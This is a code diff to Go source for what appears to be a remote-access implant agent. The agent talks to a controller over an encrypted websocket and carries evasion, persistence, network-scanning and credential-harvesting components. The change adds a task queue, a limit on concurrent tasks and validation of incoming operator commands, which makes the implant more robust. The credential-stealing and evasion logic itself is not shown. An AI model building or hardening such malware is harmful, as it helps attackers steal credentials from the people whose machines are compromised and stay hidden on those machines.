@@ -18,6 +18,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -30,16 +31,20 @@ type Config struct {
 }
 
 type Agent struct {
-	id          string
-	config      Config
-	conn        *websocket.Conn
-	crypto      *crypto.CryptoHandler
-	commander   *commands.Commander
-	fileMgr     *commands.FileManager
-	netScanner  *commands.NetworkScanner
-	evasion     *evasion.EvasionHandler
-	persistence *persistence.PersistenceHandler
-	credHarvest *postexploit.CredentialHarvester
+	id              string
+	config          Config
+	conn            *websocket.Conn
+	crypto          *crypto.CryptoHandler
+	commander       *commands.Commander
+	fileMgr         *commands.FileManager
+	netScanner      *commands.NetworkScanner
+	evasion         *evasion.EvasionHandler
+	persistence     *persistence.PersistenceHandler
+	credHarvest     *postexploit.CredentialHarvester
+	taskQueue       chan map[string]interface{}
+	activeTasks     int
+	maxActiveTasks  int
+	taskMu          sync.Mutex
 }
 
 func generateID() string {
@@ -47,18 +52,43 @@ func generateID() string {
 	return strings.ToUpper(fmt.Sprintf("%x", b))
 }
 
+func validateTask(task map[string]interface{}) bool {
+	if task == nil {
+		return false
+	}
+	taskID, ok := task["ID"].(string)
+	if !ok || len(taskID) == 0 || len(taskID) > 128 {
+		return false
+	}
+	command, ok := task["Command"].(string)
+	if !ok || len(command) == 0 || len(command) > 256 {
+		return false
+	}
+	if args, ok := task["Args"]; ok {
+		if argsStr, ok := args.(string); ok {
+			if len(argsStr) > 1048576 {
+				return false
+			}
+		}
+	}
+	return true
+}
+
 func newAgent(config Config) *Agent {
 	ph, _ := persistence.NewPersistenceHandler()
 	return &Agent{
-		id:          generateID(),
-		config:      config,
-		crypto:      crypto.NewCryptoHandler(config.Key),
-		commander:   commands.NewCommander(),
-		fileMgr:     commands.NewFileManager(),
-		netScanner:  commands.NewNetworkScanner(),
-		evasion:     evasion.NewEvasionHandler(),
-		persistence: ph,
-		credHarvest: postexploit.NewCredentialHarvester(),
+		id:             generateID(),
+		config:         config,
+		crypto:         crypto.NewCryptoHandler(config.Key),
+		commander:      commands.NewCommander(),
+		fileMgr:        commands.NewFileManager(),
+		netScanner:     commands.NewNetworkScanner(),
+		evasion:        evasion.NewEvasionHandler(),
+		persistence:    ph,
+		credHarvest:    postexploit.NewCredentialHarvester(),
+		taskQueue:      make(chan map[string]interface{}, 100),
+		maxActiveTasks: 5,
+		activeTasks:    0,
 	}
 }
 
@@ -485,6 +515,11 @@ func (a *Agent) run() {
 			var task map[string]interface{}
 			if err := json.Unmarshal(decrypted, &task); err != nil {
 				log.Printf("Unmarshal failed: %v", err)
+				continue
+			}
+
+			if !validateTask(task) {
+				log.Printf("Invalid task structure")
 				continue
 			}
 
